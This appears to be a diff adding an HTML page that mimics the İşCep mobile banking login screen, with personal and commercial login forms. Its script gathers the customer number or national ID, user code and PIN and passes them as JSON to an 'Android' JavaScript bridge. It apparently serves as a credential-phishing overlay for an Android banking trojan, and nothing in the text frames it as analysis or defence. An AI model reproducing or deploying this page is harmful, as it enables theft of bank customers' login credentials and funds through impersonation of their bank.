@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>iscep</title>
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+	body {
+		background: #ffffff;
+		margin: 0;
+		padding: 0;
+		font-family: Helvetica, sans-serif;
+	}
+	.logo {
+    text-align: center;
+    min-height: 85px;
+    background-image: linear-gradient( #1453bb, #1657bf );
+	}
+	.form {
+		text-align: center;
+		padding-top: 70px;
+	}
+	.form label {
+		display: block;
+	}
+	form {
+		display: inline-block;
+	}
+fieldset {
+	  position: relative;
+	  text-align: center;
+	  border: none;
+}
+
+input[type="text"],input[type="password"] {
+border: 1px solid #cacaca;
+    border-bottom-color: #dddddd !important;
+    line-height: 16px;
+    font-size: 20px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 5px 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 20px 0px;
+    color: #666666;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+    outline: none;
+}
+input[type="button"] {
+    left: 0;
+    right: 0;
+    width: 100%;
+    height: 42px;
+    margin: 25px 0px 0px 0px;
+    outline: none;
+    border: none;
+    float: right;
+    background: #03A9F4;
+    color: #ffffff;
+    font-weight: bold;
+    border: 1px solid #03A9F4;
+    font-size: 13px;
+    -webkit-appearance: none;
+}
+fieldset span {
+	display: inline-block;
+    width: 80%;
+    text-align: left;
+    color: #c5f8ff;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+	    display: inline-block;
+    text-align: left;
+    left: 0;
+    right: 0;
+    border: 1px solid #6fcbd8;
+    padding: 30px;
+    border-radius: 50px;
+    background: #6fcbd8;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #9b9b9b;
+}
+</style>
+
+<script type="text/javascript">
+    function bireyselform() {
+        document.getElementById("home").style.display="none";
+        document.getElementById("bireysel").style.display="block";
+    }
+    function kurumsalform() {
+        document.getElementById("home").style.display="none";
+        document.getElementById("kurumsal").style.display="block";
+    }
+    function none() {
+        document.getElementById("bireysel").style.display="none";
+        document.getElementById("home").style.display="block";
+        document.getElementById("kurumsal").style.display="none";
+    }
+</script>
+
+<div class="" id="home" style="display: block;">
+
+<style type="text/css">
+    html {
+        height: 100%;
+    }
+    body {
+    display: block;
+    background: linear-gradient(to bottom,#2196F3, #fefefe) no-repeat;
+    height: 100%;
+    }
+    .logotype {
+            text-align: center;
+    width: 100%;
+    font-size: 25px;
+    color: #fff;
+    padding-top: 5px;
+    }
+    .info {text-align: center; color: #fff; font-size: 20px; padding-top: 60px;}
+    .info-two {
+    text-align: center;
+    color: #fff;
+    padding-top: 10px;
+    }
+    .home-link {
+        padding-top: 30px;
+    }
+    .home-link a {
+            text-decoration: none;
+    color: #fff;
+    }
+</style>
+
+<fieldset>
+    <span class="logotype">İşCep</span>
+    <span class="info">Hoş Geldiniz</span>
+    <span class="info-two">BankacıIık işlemlerine hemen başlayın</span>
+    <div class="home-link">
+    <a href="#" onclick="bireyselform()" style="background: #2196F3; padding: 15px 25px 15px 25px;">BİREYSEL GİRİŞ</a>
+    <a href="#" onclick="kurumsalform()" style="background: #3F51B5; padding: 14.4px 40px 14.4px 36px; display: inline-block; margin: 20px;">TİCARİ GİRIŞ</a>
+    </div>
+
+</fieldset>
+
+</div>
+
+<div class="" id="bireysel" style="display: none;">
+
+<div class="logo">
+
+<a href="#" id="none" onclick="none()"><img src="data:image/png;base64,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" style="float: left; padding: 32px 0px 0px 20px; width: 40px;"></a>
+
+	<span>Bireysel Giriş</span>
+
+</div>
+
+<fieldset id="formtosend">
+		<input type="text" name="bireysel_musteri" placeholder="Müşteri Numarasi / TCKN - YKN">
+		<input type="password" name="bireysel_password" maxlength="6" placeholder="Şifre" onkeypress="if ( isNaN( String.fromCharCode(event.keyCode) )) return false;">
+        <div class="inf" style="line-height: 2; color: #474646; font-size: 17px;">
+            İşCep'te yeni misiniz?<br>
+            <a href="#" style="color: #1556be;">Şifre Oluşturun</a>
+        </div>
+        <input name="exit" type="hidden" text="true"/>
+		<input type="button" name="sumbit" onclick="send_form();" value="DEVAM">
+</fieldset>
+
+</div>
+
+<div class="" id="kurumsal" style="display: none;">
+
+<div class="logo">
+
+<a href="#" id="none" onclick="none()"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAD4AAAAvCAYAAAC7S3l6AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAaBSURBVGhD1Zffb1RFFMf3X7BsdxdNxESgosKDmBjTByOhPiPyq7QYgVJQfgSMCAZeTPRBeBR4MlHejOCLmKiAlba7ra1YSUSJ0Vikkhh9BOPjeM7ce+aee+bM3Xt3t1Jv8sndmTlz5nznnJndLS16/guTYv1FU37hkinD2xsjyKYIij/sU20ZuJacJ8njR+IJ7wLuW/e56ULivlYcewGjj/VNbBRo7SzbYHxuDq6dtglnvE0oUFywe8Nli7TBvsrGL1NjIVuHE5MQFM6QfkuYXQ5mmU9onWghDorkQqkfbf35TWAb0JJwPjgf4GLVTSNOMEezny/kmvMunGMXx8+yXHNkrF06Jlw6ygPNkSXPx0JwP3KObHNCY50RbjMYZRG/DfCuyMqim0uZz2ObMZbHRrZbEk43Ng+YHFI2tawSz742ZeF9NL8Ici73J8ckbWdcCk0YUS+1/ad+MPQce/8nz18ReDwhH7yfx8KEpycgyViaRRuAjZfhfdl0QZuDfXZMYd/pRDQ+73z0q2pXhDLQvQk2evOIfUuovwxY+7g/U7ikHeFS9PWbd8yKXWPmgYER1b4IJAY3IdUPkGg5Vkg4UQa4Y6IMpeQ2I7ZBNNFP7G2YNUemLD1DY862HWgDXDyA7WdjtAEdEc53tAuqgQtvJhp5dHjc2rYKicKyltAmEE64Jww6Q8ZuISB9kSVwX/wiwwdFP7l3wvQdmbasPTpteg99bWpb9PPJcTGA32hj4+OG8Sj2zfCEUzY5nmMmUBOOFXTg9I+x3Oi5PnvHrH6lYda+PuXoPZhPNCIF40ZodnlpWTgXysE+TzRl+ug3EZDtvKIp03h/aOOt0rFSp/laeWuZXqycv2zS59bGhNkHWsl+yRMAkDhpnCysB73/jJ/p1fsm7Fkm8p7pLCiOJB7dLgtPeAU6Qw4p87QpeASovU8RLW/vpw9Ogt9ojp3HfP/XtCWc0ERjpvvegPMc0/sqlHf/V8635l+jiG0R2i71+S7vPMLJJg80p8Qd5AWrAv+AHBCi8fng4u/mLOO9z+bMCfhNjpyMoXYe7Jxzs26uCo4DJ87BHGANfGtIoR0RjlWx7KXRWOrCe279+Y8TKiENrQkHlm5fuMLn/goLJ1oWjsjzjc/H9T/M2Uu3zZkLv5nTMWcu3Ir4NHrb/k+S8aKk/MU+ORve+s6s3F03D267YqpbkguVx17CAYlmiGi3ujznP9/+26x7cyZ1ufHbPc1VRmhMtvPzzOFpTxNRog9cIDfgaDb4FYUXCn9+EeLziaE+bUySzzZTOBcTQk7qxq8mEEws31U3J87PxrKj58bcXfPUoUnz2J66efzlRmFwHp9Lbc3fyj0Ns0phyYujTrhEzbgULCdVAC48JP57+E5/eMeYs6lsvWLh80KUYXMRbYyw4wDGI2NshhNe2awbILX+K5akDz/jbo7CPBAD4OdHhiag7IV4+Du6fEfD2XMqQPc9gglP4KIRTXitf8xCIqi9YtekOXn+Ziw7ejDzmvj/pXAXPMs4tXuGGn7mFfELTriEBCd92A4Lzyv+ngqnbHKSzOpUIOPSURnEcrr7R03P8CRceLLs75qlOxt2TnXruKkN1E11YBwuvbEEODI4X64RAu1T8zMgv+oPmKbAZB4wvrFdG0z6aIHl9sLzz/xSyDwPPkQRUSGqCMSFG203Ffy2JBxL3WaVAmMZ8gKFthWvXHjLdk6kbWO0QEPgOFWOtKUx7gffuEauy03ilTqIJoeELFUt83j7u6NBfpgPzU8WMgYSq1EqYuxQAsyDPPNvfzhrFg9GR8NCa7ONdMLlmrEtvinjBB03acMz7wsvQuxEhQIVNpj53e/eMLtP3TB9x2ZM7+Gr5n64G7yAUTBAoqQfbEsx+E7FF0NHx66B9tAuOWdyRzNB2+jnp8T9pNwa/onaM9wA0d+avuMz5rnj18yqvVNgl/jXAqU24TZJsfWgjWSbkwgvhC/GgwmX4Dj+trfiIet4BLxgY0KisO3644w74iR6NqyCStxZypjtqKQbMo7Bo4jqADhDhLg8LNleNw9tn/DW4hmfL5xwt7MZggkMrDaAn9OZxzZuAo5VM45DQpQZKsNUxuKS7MQGoA+MmWtwwt3icZkUwQXHfsDkCdiWINrGVeb6WaB5/ORh8WAjhVfq7UKLyIWbIQPTbDpJS6VOyEylgOyHRFB/FWwqMdVt0GaE+vmYHQdqgXX4Wun+uvkX0tFy0aTxZC4AAAAASUVORK5CYII=" style="float: left; padding: 32px 0px 0px 20px; width: 40px;"></a>
+
+    <span>Ticari Giriş</span>
+
+</div>
+
+<fieldset id="formtosend2">
+        <input type="text" name="kurumsal_musteri" placeholder="Ticari Müşteri Numarasi">
+        <input type="text" name="kurumsal_kodu" placeholder="Kullanici Kodu (Bireysel Müş. Num.)">
+        <input type="password" name="kurumsal_password" maxlength="6" placeholder="Şifre" onkeypress="if ( isNaN( String.fromCharCode(event.keyCode) )) return false;">
+        <div class="inf" style="line-height: 2; color: #474646; font-size: 17px;">
+            İşCep'te yeni misiniz?<br>
+            <a href="#" style="color: #1556be;">Şifre Oluşturun</a>
+        </div>
+        <input name="exit" type="hidden" text="true"/>
+        <input type="button" name="sumbit" onclick="send_form2();" value="DEVAM">
+</fieldset>
+
+</div>
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        returnResult : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.returnResult( formToJSONbyName(form) );
+}
+function send_form2()
+{
+    var form = document.getElementById('formtosend2');
+    Android.returnResult( formToJSONbyName(form) );
+}
+</script>
+
+</body>
+</html>
